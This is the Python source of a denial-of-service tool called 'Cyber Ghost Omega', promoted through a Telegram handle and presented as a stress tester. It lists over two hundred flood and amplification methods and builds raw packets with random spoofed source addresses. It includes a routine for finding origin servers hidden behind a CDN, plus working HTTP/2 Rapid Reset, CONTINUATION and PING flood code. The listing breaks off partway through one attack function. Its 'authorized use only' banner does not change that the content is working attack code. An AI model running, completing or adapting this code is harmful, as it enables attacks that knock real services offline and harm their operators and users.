#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CYBER GHOST OMEGA - WORLD'S MOST ADVANCED STRESS TESTER v8.0
Layer 3/4/7 | CVE-Based | Origin Finder | 120+ Methods
Creator: Cyber Ghost | @Cyber_Ghost_error_404
"""

import asyncio, aiohttp, random, socket, struct, sys, threading, time, ssl
import urllib.parse, os, json, base64, logging, ipaddress, itertools, uuid
import concurrent.futures, platform, subprocess, hashlib, hmac, zlib, gzip
import dns.resolver 
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Any, Tuple, Set
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from contextlib import suppress
from pathlib import Path
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, field_validator
import uvicorn

try: import psutil; HAS_PSUTIL = True
except: HAS_PSUTIL = False
try: import httpx; HAS_HTTPX = True
except: HAS_HTTPX = False
try: import websockets; HAS_WS = True
except: HAS_WS = False
try:
    import colorama; colorama.init(autoreset=True)
except: pass
try: import socks; HAS_SOCKS = True
except: HAS_SOCKS = False
try:
    import dns.resolver; import dns.query; import dns.message; HAS_DNS = True
except: HAS_DNS = False

CREATOR = "Cyber Ghost"; TELEGRAM = "@Cyber_Ghost_error_404"; CHANNEL = "@Cyber_Ghost_error_404"
VERSION = "8.0-OMEGA"; BUILD = "2025.03"
MAX_THREADS = 1000000; MAX_DURATION = 86400
DEFAULT_THREADS = 1000; DEFAULT_DURATION = 180
MAX_EFFECTIVE_THREADS = 50000; STATS_FLUSH_INTERVAL = 0.5
IS_WINDOWS = platform.system().lower() == "windows"
LOG_DIR = Path("ghost_logs"); LOG_DIR.mkdir(exist_ok=True)

logging.basicConfig(level=logging.WARNING,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_DIR / "cyber_ghost.log", encoding="utf-8")])
logger = logging.getLogger("cyber_ghost")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
]
REFERERS = ["https://www.google.com/","https://www.bing.com/","https://duckduckgo.com/",
            "https://www.facebook.com/","https://twitter.com/","https://www.reddit.com/",
            "https://www.youtube.com/","https://t.me/","https://www.instagram.com/"]

METHODS = [
    ("INFINITY_MIX", "🌌"),
    ("HTTP2_RAPID_RESET", "⚡"), ("HTTP2_CONTINUATION_FLOOD", "🌊"),
    ("HTTP2_PING_FLOOD", "🏓"), ("HTTP2_SETTINGS_FLOOD", "⚙️"),
    ("HTTP2_WINDOW_UPDATE_FLOOD", "🪟"), ("HTTP2_PRIORITY_FLOOD", "🎯"),
    ("HTTP2_HPACK_BOMB", "💣"), ("HTTP2_STREAM_MULTIPLEX", "🔀"),
    ("HTTP3_QUIC_FLOOD", "🚀"), ("HTTP3_0RTT_FLOOD", "⚡"),
    ("HTTP3_CONNECTION_MIGRATION", "🔄"), ("HTTP3_STREAM_RESET", "🔃"),
    ("TLS_CLIENT_HELLO_FLOOD", "👋"), ("TLS_RENEGOTIATION", "🔁"),
    ("TLS_SESSION_RESUMPTION_ABUSE", "🎫"), ("TLS_HEARTBLEED", "💔"),
    ("TLS_CCS_INJECTION", "💉"), ("TLS_POODLE", "🐩"),
    ("TLS_SWEET32", "🍬"), ("TLS_FREAK", "🎃"), ("TLS_LOGJAM", "🪵"),
    ("TLS_CRIME", "🕵️"), ("TLS_BEAST", "🐾"), ("TLS_LUCKY13", "🍀"),
    ("QUIC_VERSION_NEGOTIATION", "🔢"), ("QUIC_RETRY_FLOOD", "🔁"),
    ("SLOWLORIS_V2", "🐢"), ("SLOWLORIS_HEADER", "🐌"),
    ("SLOWLORIS_BODY", "🐛"), ("SLOW_READ_V2", "📖"),
    ("RUDY_V2", "💧"), ("RUDY_KEEPALIVE", "💦"),
    ("APACHE_KILLER_V2", "🪓"), ("APACHE_RANGE_DOS", "📏"),
    ("NGINX_RANGE_DOS", "🗡️"), ("IIS_RANGE_DOS", "🪟"),
    ("RANGE_HEADER_BOMB", "💥"), ("CACHE_POISONING", "☠️"),
    ("CACHE_DECEPTION", "🎭"), ("CACHE_BYPASS_V2", "🗝️"),
    ("HOST_HEADER_INJECTION", "📮"), ("HTTP_SMUGGLING_CLTE", "🕵️"),
    ("HTTP_SMUGGLING_TECL", "🕵️‍♂️"), ("HTTP_SMUGGLING_TETE", "🕵️‍♀️"),
    ("REQUEST_SMUGGLING_H2C", "🚇"), ("WEB_CACHE_POISON", "🧪"),
    ("WEBSOCKET_FRAME_FLOOD", "🔌"), ("WEBSOCKET_PING_FLOOD", "🏓"),
    ("WEBSOCKET_PERMESSAGE_DEFLATE_BOMB", "💣"), ("WEBSOCKET_UPGRADE_FLOOD", "⬆️"),
    ("GRAPHQL_DEPTH_BOMB", "📊"), ("GRAPHQL_ALIAS_BOMB", "🎭"),
    ("GRAPHQL_BATCH_FLOOD", "📦"), ("GRAPHQL_INTROSPECTION_FLOOD", "🔍"),
    ("GRPC_STREAM_FLOOD", "⚙️"), ("GRPC_METADATA_FLOOD", "📋"),
    ("JSON_BOMB", "💣"), ("XML_BOMB", "💥"), ("YAML_BOMB", "🧨"),
    ("ZIP_BOMB", "🗜️"), ("GZIP_BOMB", "🎁"), ("BROTLI_BOMB", "🌀"),
    ("REGEX_DOS_REDOS", "🔴"), ("REJEX_CATASTROPHIC", "💀"),
    ("DNS_QUERY_FLOOD", "📡"), ("DNS_ANY_AMPLIFICATION", "🔊"),
    ("DNS_NXDOMAIN_FLOOD", "❓"), ("DNS_NSEC_WALK", "🚶"),
    ("DNS_ZONE_TRANSFER", "📤"), ("DNS_CACHE_POISON", "☠️"),
    ("DNSSEC_VALIDATION_BOMB", "🔐"), ("DNS_LAME_DELEGATION", "🦵"),
    ("DNS_DYNAMIC_UPDATE_FLOOD", "🔄"),
    ("NTP_MONLIST", "🕐"), ("NTP_MODE6_FLOOD", "📶"),
    ("NTP_MODE7_FLOOD", "🎛️"), ("NTP_KISS_OF_DEATH", "💋"),
    ("MEMCACHED_STATS_AMP", "📊"), ("MEMCACHED_GET_AMP", "💾"),
    ("MEMCACHED_MULTIGET_BOMB", "💣"),
    ("SSDP_MSEARCH_AMP", "🔌"), ("SSDP_NOTIFY_FLOOD", "📢"),
    ("SSDP_MULTICAST_STORM", "🌪️"),
    ("CLDAP_SEARCH_AMP", "📂"), ("CLDAP_BIND_AMP", "🔗"),
    ("LDAP_SEARCH_BOMB", "🔍"), ("LDAP_BIND_FLOOD", "🚪"),
    ("CHARGEN_AMP", "⚡"), ("QOTD_AMP", "📜"), ("DAYTIME_AMP", "☀️"),
    ("SNMP_GETBULK_AMP", "📊"), ("SNMP_GETNEXT_LOOP", "🔄"),
    ("NETBIOS_NS_AMP", "🪟"), ("NETBIOS_WINS_AMP", "🏆"),
    ("RIP_V1_AMP", "🛣️"), ("RIP_V2_AMP", "🛤️"),
    ("MDNS_AMP", "🖥️"), ("WSD_DISCOVERY_AMP", "🔎"),
    ("STUN_BINDING_AMP", "🌐"), ("DTLS_HELLO_AMP", "🔒"),
    ("COAP_AMP", "🌊"), ("TFTP_AMP", "📦"), ("WS_DISCOVERY_AMP", "🔍"),
    ("NFS_PORTMAPPER_FLOOD", "🗺️"), ("NFS_MOUNT_FLOOD", "📂"),
    ("RPC_DUMP_FLOOD", "🔍"), ("PORTMAPPER_AMP", "📡"),
    ("REDIS_SET_FLOOD", "🔴"), ("REDIS_PIPELINE_BOMB", "💣"),
    ("REDIS_LUA_SCRIPT_FLOOD", "📜"), ("REDIS_REPLICA_FLOOD", "🔄"),
    ("MONGO_OP_MSG_FLOOD", "🍃"), ("MONGO_AGGREGATE_BOMB", "💣"),
    ("CASSANDRA_BATCH_FLOOD", "👁️"), ("CASSANDRA_CQL_BOMB", "💥"),
    ("ELASTIC_SEARCH_BOMB", "🔍"), ("ELASTIC_AGGREGATION_FLOOD", "📊"),
    ("ELASTIC_SCROLL_FLOOD", "📜"), ("ELASTIC_MSEARCH_BOMB", "💣"),
    ("MQTT_PUBLISH_FLOOD", "📬"), ("MQTT_SUBSCRIBE_BOMB", "💣"),
    ("AMQP_CHANNEL_BOMB", "🐰"), ("AMQP_QUEUE_DECLARE_FLOOD", "📦"),
    ("KAFKA_PRODUCE_FLOOD", "📨"), ("KAFKA_METADATA_FLOOD", "📋"),
    ("ZOOKEEPER_FLOOD", "🦁"), ("ETCD_FLOOD", "🔑"),
    ("CONSUL_FLOOD", "🏛️"), ("VAULT_FLOOD", "🔐"),
    ("KUBERNETES_API_FLOOD", "☸️"), ("DOCKER_API_FLOOD", "🐳"),
    ("RDP_CONNECTION_FLOOD", "🖥️"), ("RDP_NEGOTIATION_BOMB", "💣"),
    ("VNC_RFB_FLOOD", "🖼️"), ("VNC_AUTH_FLOOD", "🔐"),
    ("SMB_NEGOTIATE_FLOOD", "🗂️"), ("SMB_TREE_CONNECT_FLOOD", "🌳"),
    ("SMB2_MULTI_CREDIT_BOMB", "💳"),
    ("SMTP_EHLO_FLOOD", "✉️"), ("SMTP_DATA_BOMB", "💣"),
    ("SMTP_AUTH_FLOOD", "🔐"), ("SMTP_PIPELINING_FLOOD", "🚇"),
    ("IMAP_LOGIN_FLOOD", "📧"), ("IMAP_SELECT_FLOOD", "📂"),
    ("POP3_AUTH_FLOOD", "📬"), ("POP3_RETR_FLOOD", "📩"),
    ("FTP_USER_FLOOD", "📁"), ("FTP_PASV_FLOOD", "📡"),
    ("FTP_STOR_BOMB", "💾"), ("FTP_MKD_FLOOD", "📁"),
    ("TELNET_IAC_FLOOD", "📞"), ("TELNET_OPTION_FLOOD", "⚙️"),
    ("SSH_KEX_FLOOD", "🔑"), ("SSH_AUTH_BOMB", "💣"),
    ("SSH_CHANNEL_FLOOD", "📡"),
    ("SIP_INVITE_FLOOD", "📞"), ("SIP_REGISTER_FLOOD", "📝"),
    ("SIP_OPTIONS_FLOOD", "⚙️"), ("SIP_BYE_FLOOD", "👋"),
    ("RTP_PACKET_FLOOD", "🎤"), ("RTCP_REPORT_FLOOD", "📊"),
    ("RTSP_DESCRIBE_FLOOD", "🎥"), ("RTSP_SETUP_FLOOD", "⚙️"),
    ("RTSP_PLAY_FLOOD", "▶️"), ("RTSP_TEARDOWN_FLOOD", "⏹️"),
    ("H323_CALL_FLOOD", "📞"), ("MGCP_FLOOD", "📡"),
    ("IPTV_IGMP_JOIN_FLOOD", "📺"), ("IPTV_MULTICAST_STORM", "🌪️"),
    ("MINECRAFT_STATUS_FLOOD", "⛏️"), ("MINECRAFT_LOGIN_FLOOD", "🔑"),
    ("MINECRAFT_QUERY_FLOOD", "❓"), ("MINECRAFT_RCON_FLOOD", "🖥️"),
    ("FIVEM_QUERY_FLOOD", "🚗"), ("FIVEM_HTTP_FLOOD", "🌐"),
    ("TEAMSPEAK_QUERY_FLOOD", "🎧"), ("TEAMSPEAK_VOICE_FLOOD", "🎤"),
    ("STEAM_A2S_FLOOD", "🎮"), ("STEAM_A2S_INFO_FLOOD", "ℹ️"),
    ("STEAM_A2S_RULES_FLOOD", "📋"), ("STEAM_A2S_PLAYERS_FLOOD", "👥"),
    ("SAMP_QUERY_FLOOD", "🔫"), ("SAMP_RCON_FLOOD", "🖥️"),
    ("CSGO_QUERY_FLOOD", "🔫"), ("CSGO_GETCHALLENGE_FLOOD", "❓"),
    ("RUST_QUERY_FLOOD", "🦀"), ("ARK_QUERY_FLOOD", "🦖"),
    ("VALHEIM_QUERY_FLOOD", "⚔️"), ("TERRARIA_QUERY_FLOOD", "🌳"),
    ("BITTORRENT_DHT_PING", "🌊"), ("BITTORRENT_DHT_FIND_NODE", "🔍"),
    ("BITTORRENT_DHT_ANNOUNCE", "📢"), ("BITTORRENT_TRACKER_FLOOD", "📡"),
    ("EMULE_SERVER_FLOOD", "🐴"), ("EMULE_KAD_FLOOD", "🕸️"),
    ("GNUTELLA_PING_FLOOD", "🌐"), ("GNUTELLA_QUERY_FLOOD", "❓"),
    ("EDONKEY_FLOOD", "🐴"), ("FASTTRACK_FLOOD", "⚡"),
    ("SSL_RENEG_V2", "🔒"), ("SSL_HELLO_V2", "👋"),
    ("SNI_FLOOD_V2", "🎭"), ("SNI_MISMATCH_FLOOD", "❌"),
    ("ALPN_CONFUSION_FLOOD", "🔀"), ("OCSP_STAPLING_FLOOD", "📜"),
    ("CERTIFICATE_CHAIN_BOMB", "💣"), ("JWT_ALGORITHM_CONFUSION", "🔐"),
    ("JWT_KID_INJECTION", "💉"), ("OAUTH_STATE_FLOOD", "🔄"),
    ("OPENID_DISCOVERY_FLOOD", "🔍"), ("SAML_REQUEST_BOMB", "💣"),
    ("WEBSOCKET_COMPRESSION_BOMB", "💣"), ("WEBSOCKET_MASK_FLOOD", "🎭"),
    ("WEBSOCKET_EXTENSION_FLOOD", "🔧"), ("WEBSOCKET_CLOSE_FLOOD", "❌"),
]
METHOD_EMOJI = dict(METHODS)
ALL_METHOD_NAMES = [m for m, _ in METHODS]

class C:
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    BLUE="\033[94m"; MAGENTA="\033[95m"; CYAN="\033[96m"; WHITE="\033[97m"

def clear_screen(): os.system("cls" if IS_WINDOWS else "clear")
def term_width():
    try: return min(os.get_terminal_size().columns, 130)
    except: return 110
def safe_input(prompt, default=""):
    try:
        v = input(prompt).strip(); return v if v else default
    except (EOFError, KeyboardInterrupt): return default

BANNER = r"""
   ██████╗██╗   ██╗██████╗ ███████╗██████╗      ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██║  ███╗███████║██║   ██║███████╗   ██║   
  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██║   ██║██╔══██║██║   ██║╚════██║   ██║   
  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
                                    O M E G A
"""

def print_banner():
    clear_screen(); w = term_width()
    for line in BANNER.strip("\n").split("\n"):
        print(f"{C.CYAN}{C.BOLD}{' ' * max(0, (w - len(line)) // 2)}{line}{C.RESET}")
    print()
    tag = f"⚡ OMEGA EDITION v{VERSION} — Build {BUILD} ⚡"
    print(f"{C.YELLOW}{C.BOLD}{' ' * max(0, (w - len(tag)) // 2)}{tag}{C.RESET}")
    print()
    info = f"🧠 Creator: {CREATOR}   |   📱 {TELEGRAM}   |   📢 {CHANNEL}"
    print(f"{C.MAGENTA}{C.BOLD}{' ' * max(0, (w - len(info)) // 2)}{info}{C.RESET}")
    print()
    print(f"{C.RED}{C.BOLD}{'═' * w}{C.RESET}")
    for msg in ["⚠️  WARNING / هشدار", "FOR AUTHORIZED SECURITY TESTING ONLY",
                "Unauthorized use is a CRIMINAL OFFENSE",
                "Use ONLY on your own servers — فقط روی سرور شخصی خودتان"]:
        print(f"{C.RED}{C.BOLD}{' ' * max(0, (w - len(msg)) // 2)}{msg}{C.RESET}")
    print(f"{C.RED}{C.BOLD}{'═' * w}{C.RESET}\n")

def print_mode_menu():
    w = term_width()
    print(f"{C.GREEN}{C.BOLD}╔{'═' * (w - 2)}╗{C.RESET}")
    title = "SELECT MODE  |  حالت را انتخاب کنید"
    print(f"{C.GREEN}{C.BOLD}║{' ' * ((w - 2 - len(title)) // 2)}{title}{' ' * (w - 2 - (w - 2 - len(title)) // 2 - len(title))}║{C.RESET}")
    print(f"{C.GREEN}{C.BOLD}╠{'═' * (w - 2)}╣{C.RESET}")
    for o in ["  [1]  🖥️   Terminal Attack Mode   (CLI)",
              "  [2]  🌐   Web Panel Mode         (0.0.0.0:8000)"]:
        print(f"{C.GREEN}║{C.RESET}{C.CYAN}{o}{' ' * (w - 2 - len(o))}{C.GREEN}║{C.RESET}")
    print(f"{C.GREEN}{C.BOLD}╚{'═' * (w - 2)}╝{C.RESET}\n")
    while True:
        v = safe_input(f"{C.YELLOW}{C.BOLD}>> Enter 1 or 2: {C.RESET}")
        if v in ("1", "2"): return v

def _checksum(data):
    if len(data) % 2: data += b'\x00'
    total = 0
    for i in range(0, len(data), 2): total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xffff); total += total >> 16
    return (~total) & 0xffff

def ip_header(src, dst, proto, plen, ttl=64, frag_off=0):
    tl = 20 + plen
    h = struct.pack('!BBHHHBBH4s4s', 69, 0, tl, random.randint(0, 65535), frag_off, ttl, proto, 0,
                    socket.inet_aton(src), socket.inet_aton(dst))
    return struct.pack('!BBHHHBBH4s4s', 69, 0, tl, random.randint(0, 65535), frag_off, ttl, proto,
                       _checksum(h), socket.inet_aton(src), socket.inet_aton(dst))

def tcp_packet(src, dst, sp, dp, seq, ack, flags, payload=b'', ttl=64):
    opts = b'\x02\x04\x05\xb4\x04\x02\x01\x03\x03\x07'
    doff = (20 + len(opts)) // 4
    h = struct.pack('!HHLLBBHHH', sp, dp, seq, ack, (doff << 4), flags, 65535, 0, 0) + opts
    pseudo = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(dst),
                         0, socket.IPPROTO_TCP, len(h) + len(payload))
    ck = _checksum(pseudo + h + payload)
    h = struct.pack('!HHLLBBH', sp, dp, seq, ack, (doff << 4), flags, 65535) + struct.pack('!H', ck) + struct.pack('!H', 0) + opts
    return ip_header(src, dst, socket.IPPROTO_TCP, len(h) + len(payload), ttl) + h + payload

def udp_packet(src, dst, sp, dp, payload, ttl=64):
    ulen = 8 + len(payload)
    h = struct.pack('!HHHH', sp, dp, ulen, 0)
    pseudo = struct.pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(dst), 0, socket.IPPROTO_UDP, ulen)
    ck = _checksum(pseudo + h + payload) or 0xffff
    return ip_header(src, dst, socket.IPPROTO_UDP, ulen, ttl) + struct.pack('!HHHH', sp, dp, ulen, ck) + payload

def icmp_packet(src, dst, payload, typ=8, code=0):
    iid = random.randint(0, 65535); iseq = random.randint(0, 65535)
    h = struct.pack('!BBHHH', typ, code, 0, iid, iseq)
    ck = _checksum(h + payload)
    return ip_header(src, dst, socket.IPPROTO_ICMP, len(h) + len(payload)) + struct.pack('!BBHHH', typ, code, ck, iid, iseq) + payload

def fragmented_ip(src, dst, proto, payload, frag_size=8):
    pkts = []; ident = random.randint(0, 65535); off = 0; total = len(payload)
    while off < total:
        chunk = payload[off:off + frag_size]; start = off; off += len(chunk)
        mf = 1 if off < total else 0; fo = (start // 8) << 3 | mf
        tl = 20 + len(chunk)
        h = struct.pack('!BBHHHBBH4s4s', 69, 0, tl, ident, fo, 64, proto, 0,
                        socket.inet_aton(src), socket.inet_aton(dst))
        pkts.append(struct.pack('!BBHHHBBH4s4s', 69, 0, tl, ident, fo, 64, proto, _checksum(h),
                                socket.inet_aton(src), socket.inet_aton(dst)) + chunk)
    return pkts

class AttackConfig(BaseModel):
    target: str; port: int = 80; method: str = "INFINITY_MIX"
    threads: int = DEFAULT_THREADS; duration: int = DEFAULT_DURATION
    bandwidth_limit: int = 0; use_proxy: bool = False; lang: str = "en"
    origin_ip: str = ""

    @field_validator('threads')
    def v_t(cls, v):
        if v < 1 or v > MAX_THREADS: raise ValueError(f"threads 1..{MAX_THREADS}")
        return v
    @field_validator('duration')
    def v_d(cls, v):
        if v < 1 or v > MAX_DURATION: raise ValueError(f"duration 1..{MAX_DURATION}")
        return v

class TLSStats:
    __slots__ = ('sent', 'failed', 'bytes_sent', 'errors', 'methods')
    def __init__(self):
        self.sent = 0; self.failed = 0; self.bytes_sent = 0
        self.errors = defaultdict(int); self.methods = defaultdict(int)
    def flush(self, target, lock):
        if self.sent == 0 and self.failed == 0 and self.bytes_sent == 0: return
        with lock:
            target["sent"] += self.sent; target["failed"] += self.failed
            target["bytes_sent"] += self.bytes_sent
            for k, v in self.errors.items(): target["errors"][k] = target["errors"].get(k, 0) + v
            for k, v in self.methods.items(): target["methods_used"][k] = target["methods_used"].get(k, 0) + v
        self.sent = 0; self.failed = 0; self.bytes_sent = 0
        self.errors.clear(); self.methods.clear()

class CyberGhost:
    def __init__(self):
        self.running = False; self._stop = False
        self.target_url = ""; self.target_ip = ""; self.target_host = ""
        self.target_port = 80; self.method = "INFINITY_MIX"
        self.threads = DEFAULT_THREADS; self.duration = DEFAULT_DURATION
        self.bandwidth_limit = 0; self.use_proxy = False
        self.origin_ip = ""
        self.stats = self._new_stats()
        self.lock = threading.Lock(); self.launch_lock = threading.Lock()
        self._tls = threading.local()
        self.raw_tcp = None; self.raw_udp = None; self.raw_icmp = None; self.raw_ip = None
        self._last_bytes = 0; self._last_check = time.monotonic()
        self.executor = None; self._sessions = {}

    def _new_stats(self):
        return {"sent": 0, "failed": 0, "bytes_sent": 0, "start_time": None,
                "end_time": None, "end_time_planned": None, "monotonic_start": None,
                "errors": {}, "methods_used": {}}
    def _t(self):
        s = getattr(self._tls, 'stats', None)
        if s is None: s = TLSStats(); self._tls.stats = s
        return s
    def _flush(self):
        s = getattr(self._tls, 'stats', None)
        if s: s.flush(self.stats, self.lock)
    def _init_raw(self):
        for name, proto, attr, hdrincl in [
            ("TCP", socket.IPPROTO_TCP, "raw_tcp", True),
            ("UDP", socket.IPPROTO_UDP, "raw_udp", True),
            ("ICMP", socket.IPPROTO_ICMP, "raw_icmp", False),
            ("RAW", socket.IPPROTO_RAW, "raw_ip", True)]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
                if hdrincl: s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
                setattr(self, attr, s)
            except Exception as e:
                logger.warning(f"{name} raw: {e}"); setattr(self, attr, None)
    def _close_raw(self):
        for a in ("raw_tcp", "raw_udp", "raw_icmp", "raw_ip"):
            s = getattr(self, a, None)
            if s:
                with suppress(Exception): s.close()
                setattr(self, a, None)
    def _rip(self):
        for _ in range(20):
            ip = ipaddress.ip_address(random.getrandbits(32))
            if not (ip.is_private or ip.is_loopback or ip.is_multicast or ip.is_reserved or ip.is_link_local or ip.is_unspecified):
                return str(ip)
        return "1.2.3.4"
    def _rport(self): return random.randint(1024, 65535)
    def _rua(self): return random.choice(USER_AGENTS)
    def _rref(self): return random.choice(REFERERS)
    def _check_bw(self):
        if self.bandwidth_limit == 0: return
        now = time.monotonic()
        if now - self._last_check < 1.0: return
        with self.lock: cur = self.stats["bytes_sent"]
        elapsed = now - self._last_check
        mbps = ((cur - self._last_bytes) * 8) / elapsed / 1_000_000
        self._last_bytes = cur; self._last_check = now
        if mbps > self.bandwidth_limit:
            time.sleep(min(0.05, (mbps - self.bandwidth_limit) / 2000.0))
    async def _session(self, name="default"):
        s = self._sessions.get(name)
        if s is not None and not s.closed: return s
        conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=30, force_close=False,
                                     enable_cleanup_closed=True, ssl=False)
        t = aiohttp.ClientTimeout(total=4, connect=2, sock_read=2)
        s = aiohttp.ClientSession(connector=conn, timeout=t, headers={"Connection": "keep-alive"})
        self._sessions[name] = s
        return s

    # ========== ORIGIN IP FINDER ==========
    def find_origin_ip(self):
        """Try to find real server IP behind Cloudflare/CDN"""
        print(f"{C.CYAN}[🔍] Searching for origin IP...{C.RESET}")
        candidates = set()
        host = self.target_host
        subs = ["direct", "origin", "backend", "server", "www", "mail", "ftp", "cpanel", "webmail", "smtp", "ns1", "ns2", "dev", "staging", "test", "api", "admin", "portal", "old", "new"]
        for sub in subs:
            try:
                fqdn = f"{sub}.{host}"
                ip = socket.gethostbyname(fqdn)
                if ip and not ip.startswith("104.16") and not ip.startswith("104.17") and not ip.startswith("104.18") and not ip.startswith("172.6") and not ip.startswith("172.7"):
                    candidates.add((fqdn, ip))
                    print(f"{C.GREEN}  [+] {fqdn} -> {ip}{C.RESET}")
            except: pass
        # Try common ports
        if candidates:
            print(f"{C.GREEN}[✓] Found {len(candidates)} candidate(s){C.RESET}")
            return list(candidates)[0][1]
        print(f"{C.YELLOW}[!] No origin IP found — using CDN IP{C.RESET}")
        return self.target_ip

    # ========== HTTP/2 RAPID RESET (CVE-2023-44487) ==========
    def _h2_rapid_reset(self):
        t = self._t()
        last = time.monotonic()
        # HTTP/2 connection preface + SETTINGS
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                s.send(preface + settings)
                # Send many HEADERS + RST_STREAM pairs
                for i in range(500):
                    if self._stop: break
                    stream_id = (i * 2 + 1) & 0x7fffffff
                    # HEADERS frame (minimal)
                    headers_payload = b"\x82\x86\x84\x41\x8c\xf1\xe3\xc0\xbf"
                    h_frame = struct.pack("!I", len(headers_payload))[1:] + b"\x01\x04" + struct.pack("!I", stream_id) + headers_payload
                    # RST_STREAM frame (CANCEL)
                    rst_payload = struct.pack("!I", 0x08)
                    r_frame = struct.pack("!I", len(rst_payload))[1:] + b"\x03\x00" + struct.pack("!I", stream_id) + rst_payload
                    try:
                        s.send(h_frame + r_frame)
                        t.sent += 2
                        t.bytes_sent += len(h_frame) + len(r_frame)
                        t.methods["HTTP2_RAPID_RESET"] += 2
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== HTTP/2 CONTINUATION FLOOD (CVE-2024-27316) ==========
    def _h2_continuation_flood(self):
        t = self._t(); last = time.monotonic()
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                s.send(preface + settings)
                # HEADERS without END_HEADERS flag, then endless CONTINUATION
                stream_id = 1
                h_payload = b"\x82\x86\x84"
                h_frame = struct.pack("!I", len(h_payload))[1:] + b"\x01\x00" + struct.pack("!I", stream_id) + h_payload
                s.send(h_frame)
                # Send 10000 CONTINUATION frames
                cont_payload = b"\x00" * 1024
                cont_frame = struct.pack("!I", len(cont_payload))[1:] + b"\x09\x00" + struct.pack("!I", stream_id) + cont_payload
                for i in range(1000):
                    if self._stop: break
                    try:
                        s.send(cont_frame)
                        t.sent += 1; t.bytes_sent += len(cont_frame)
                        t.methods["HTTP2_CONTINUATION_FLOOD"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== HTTP/2 PING FLOOD ==========
    def _h2_ping_flood(self):
        t = self._t(); last = time.monotonic()
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
                s.send(preface + settings)
                # Send PING frames rapidly without ACK
                for _ in range(2000):
                    if self._stop: break
                    ping_payload = os.urandom(8)
                    ping_frame = struct.pack("!I", 8)[1:] + b"\x06\x00\x00\x00\x00\x00" + ping_payload
                    try:
                        s.send(ping_frame)
                        t.sent += 1; t.bytes_sent += len(ping_frame)
                        t.methods["HTTP2_PING_FLOOD"] += 1
                    except: break
                with suppress(Exception): s.close()
            except Exception as e:
